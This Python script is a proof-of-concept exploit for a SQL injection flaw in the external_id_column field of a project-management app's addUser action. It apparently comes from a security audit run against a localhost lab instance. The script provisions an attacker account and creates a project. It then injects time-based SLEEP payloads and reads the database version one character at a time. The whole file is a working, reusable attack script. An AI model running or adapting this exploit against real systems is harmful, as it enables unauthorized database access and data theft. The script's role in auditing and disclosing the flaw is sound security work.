#!/usr/bin/env python3
"""PoC: CVE-2026-33058 — SQLi via ProjectPermissionController::addUser.

UserModel::getOrCreateExternalUserId() splices the attacker-controlled
`external_id_column` straight into the WHERE clause:

    $this->db->table(self::TABLE)->eq($externalIdColumn, $externalId)->findOneColumn('id')

Column names cannot be bound as values; v1.2.44 does not whitelist it.
Anyone with permission to add users to a project can inject SQL. This PoC
uses a time-based oracle to extract version().
"""
import pathlib
import re
import sys
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from kb import KB

BASE = "http://localhost:8080"
USER_CREATE = "/?controller=UserCreationController&action=show"
PROJ_CREATE = "/?controller=ProjectCreationController&action=create"
EVID = pathlib.Path(__file__).resolve().parent.parent / "evidence" / "04-deep-audit"


def die(msg):
    print("[setup-fail] " + msg)
    sys.exit(1)


def form(html):
    m = re.search(r'<form[^>]*method="post"[^>]*action="([^"]+)"', html)
    action = m.group(1).replace("&amp;", "&") if m else None
    fields = set(re.findall(r'<(?:input|select|textarea)[^>]*name="([^"]+)"', html))
    return action, fields, KB.csrf_token(html)


def extract_project_id(html):
    m = re.search(r'project_id=(\d+)', html)
    return m.group(1) if m else None


print("== CVE-2026-33058 PoC: SQLi via addUser external_id_column ==")

admin = KB(BASE)
if not admin.login("admin", "admin"):
    die("admin login failed")
a, f, tok = form(admin.get(USER_CREATE))
data = {"username": "sqliatk", "name": "SQLi Attacker", "email": "sqliatk@lab.invalid",
        "role": "app-manager", "csrf_token": tok}
if "password" in f:
    data["password"] = "sqliatk-P1"
    data["confirmation"] = "sqliatk-P1"
admin.post(a, data)

atk = KB(BASE)
if not atk.login("sqliatk", "sqliatk-P1"):
    die("attacker login failed")
print("[1] attacker provisioned + logged in (app-manager)")

a2, f2, tok2 = form(atk.get(PROJ_CREATE))
if tok2 is None or "name" not in f2:
    die("project-create form not found")
resp = atk.post(a2, {"name": "SQLi Playground", "csrf_token": tok2})
pid = extract_project_id(resp)
if pid is None:
    die("project create failed (no project_id in response)")
print("[2] attacker project created: id", pid)

members = atk.get("/?controller=ProjectPermissionController&action=index&project_id=" + pid)
ua, uf, utok = form(members)
if utok is None:
    die("members page form not found; response head: " + members[:300])
print("[3] addUser action:", ua, "| form fields:", sorted(uf))


def add_user(column, extid="1"):
    fields = {"csrf_token": utok, "user_id": "", "username": "extuser", "name": "Ext User",
              "external_id": extid, "external_id_column": column, "role": "project-viewer"}
    t0 = time.time()
    try:
        r = atk.post(ua, fields)
        err = None
    except Exception as e:
        r = ""
        err = str(e)
    return time.time() - t0, r, err


dt, r, err = add_user("id", "99999")
print("[4] control (column=id) elapsed %.2fs | err: %s" % (dt, err))

dt_sleep, r, err = add_user("IF(1=1, SLEEP(6), id)")
print("[5] SLEEP(6) payload elapsed %.2fs | err: %s" % (dt_sleep, err))

charset = "10.23456789"
version = ""
for pos in range(1, 7):
    found = None
    for ch in charset:
        col = "IF((SELECT SUBSTRING(version(),%d,1))='%s', SLEEP(4), id)" % (pos, ch)
        d, _, _ = add_user(col)
        if d >= 3.5:
            found = ch
            break
    if not found:
        break
    version += found
    print("    [char %d] %r -> version so far %r" % (pos, found, version))

print("[6] extracted MariaDB version():", repr(version))
EVID.mkdir(parents=True, exist_ok=True)
(EVID / "sqli-timing-transcript.txt").write_text(
    "CVE-2026-33058 timing-oracle transcript\n"
    "control (column=id) elapsed: %.2fs\n"
    "SLEEP(6) payload elapsed: %.2fs\n"
    "version() extracted via per-char timing oracle: %s\n" % (dt, dt_sleep, version))

if dt_sleep >= 3.5:
    print("[VERDICT] VULNERABLE — attacker-controlled SQL in WHERE; version() =", version)
    sys.exit(0)
print("[VERDICT] timing oracle did not fire — inspect output")
sys.exit(1)
